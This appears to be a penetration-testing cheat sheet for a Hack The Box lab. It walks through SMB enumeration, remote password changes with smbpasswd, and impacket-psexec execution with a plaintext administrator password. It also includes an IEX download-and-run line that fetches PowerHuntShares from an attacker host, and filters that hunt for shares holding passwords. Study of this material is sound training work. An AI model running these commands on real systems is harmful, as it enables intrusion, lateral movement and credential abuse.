# SMB-Password-Management

## SMB Password Management & Enumeration

### Target
Lab: Hack The Box — Fuse HTB

---

## 1. Scan SMB Services with Nmap

```
nmap -v -sT -sV -sC -A -p 135,139,445 192.168.1.71
```

Performs a detailed scan of SMB-related services:

- `-sT` → TCP Connect scan  
- `-sV` → Service & version detection  
- `-sC` → Default NSE scripts  
- `-A` → OS detection, traceroute, scripts  

**Ports:**
- 135 → RPC  
- 139 → NetBIOS  
- 445 → SMB  

---

## 2. Enumerate SMB Shares with smbclient

### List Available Shares

```
smbclient -L //192.168.1.71 -U u1
smbclient -L //192.168.1.50 -U 'ankit.sharma'
smbclient -L //192.168.10.101 -U jdoe@infosecwarrior.local
smbclient -L //192.168.10.101 -U infosecwarrior.local\jdoe
```

- `-L` → Lists shares on the target  
- Prompts for password  

**Useful for:**
- Anonymous access checks  
- Credential validation  
- Share discovery  

---

## 3. smbpasswd Usage

### View Help

```
smbpasswd -h
```

Displays available options and usage details.

---

### Change SMB Password (Remote)

```
smbpasswd -r 192.168.1.71 -U u1
smbpasswd -r 192.168.1.71 -U Win7
smbpasswd -r 192.168.1.50 -U 'ankit.sharma'
smbpasswd -D 3 -r 192.168.2.100 -U 'infosecwarrior.local\administrator'
smbpasswd -D 3 -r 192.168.2.100 -U 'infosecwarrior.local\jdoe'
```

- `-r` → Target remote SMB server  
- `-U` → Username  

**Use Cases:**
- Reset compromised credentials  
- Test weak password policies  
- Validate password change permissions  

---

### Enable Debug Mode

```
smbpasswd -D 3 -r 192.168.1.50 -U 'ankit.sharma'
```

- `-D 3` → Debug level 3 (verbose output)

**Helps troubleshoot:**
- Authentication failures  
- Network issues  
- SMB negotiation problems  

---

## 4. Remote Command Execution (Impacket psexec)

```
impacket-psexec infosecwarrior.local/administrator:'@rmour1234'@192.168.2.100
```

Executes commands on the remote system using SMB.

**Requirements:**
- Valid credentials  
- Administrative privileges on target  

**Common Uses:**
- Post-exploitation  
- Lateral movement  
- Privilege validation  

---

## Notes & Tips

- SMB password changes require:
  - Valid credentials  
  - Proper permissions (not all users can reset passwords)

- If password reset fails:
  - Try debug mode (`-D 3`)  
  - Verify SMB signing / policies  

- Always verify access using:

```
smbclient //target/share -U user
```


# PowerHuntShares

## PowerHuntShares

PowerHuntShares is a PowerShell tool used for discovering and analyzing network shares within an Active Directory environment. It helps identify insecure or misconfigured shared folders that could lead to privilege escalation or lateral movement by attackers.

- Discovers all network shares in an Active Directory environment  
- Identifies weak permissions (e.g., Everyone or Authenticated Users with Write access)  
- Generates CSV and JSON reports for easy analysis  
- Useful for security assessments to find potential attack paths  

---

## How to Use PowerHuntShares

### PowerHuntShares - SMB Share Enumeration & Analysis

- GitHub Repo: NetSPI/PowerHuntShares  

**Description:**  
PowerHuntShares is a PowerShell tool designed to identify and analyze network shares within an Active Directory environment. It helps security teams identify misconfigured shares that may lead to data exposure and privilege escalation.

### Step 1: Download PowerHuntShares

Clone the GitHub Repository (Attacker Machine):

```
git clone https://github.com/NetSPI/PowerHuntShares.git
cd PowerHuntShares
```

```
powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.10.7/PowerHuntShares.ps1', 'PowerHuntShares.ps1')

Invoke-WebRequest http://192.168.10.7/PowerHuntShares.psm1 -OutFile PowerHuntShares.psm1

IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.7/PowerHuntShares.psm1')
```

## Core Commands

### 🔍 Enumerate Open Shares

```
Find-OpenShares -Verbose
```

---

### 🌐 Scan Specific Domain

```
Find-OpenShares -Domain "infosecwarrior.local"
```

---

### 🎯 Target Specific Host

```
Find-OpenShares -ComputerName "Target-PC"
```

---

### 💾 Export Results

```
Find-OpenShares | Export-Csv -Path "Shares_Report.csv" -NoTypeInformation
```

---

## Advanced Enumeration

### 🚀 Host List Scanning (Stealthier)

```
Invoke-HuntSMBShares -NoPing -OutputDirectory C:\ADtools\ -HostList C:\ADtools\servers.txt
```

---

### Parameters

| Parameter        | Description                              |
|-----------------|------------------------------------------|
| -NoPing         | Skip ICMP checks (useful if ping blocked)|
| -HostList       | File containing target hosts             |
| -OutputDirectory| Location to store results                |

---

### Example Host List

```
192.168.1.10
192.168.1.20
DC01
FileServer
```

---

## Filtering & Hunting

### 🔐 Find Sensitive Shares

```
Find-OpenShares -Verbose | Where-Object { $_.Path -match "finance|password|backup" }
```

---

### ⚠️ Identify Weak Permissions

```
Find-OpenShares | Where-Object { $_.Permissions -match "Everyone|Authenticated Users" }
```

---

### 📊 Export Only Weak Shares

```
Invoke-HuntSMBShares -NoPing -OutputDirectory C:\ADtools\ -HostList C:\ADtools\servers.txt |
Where-Object { $_.Permissions -match "Everyone|Authenticated Users" } |
Export-Csv -Path C:\ADtools\WeakShares.csv -NoTypeInformation
```
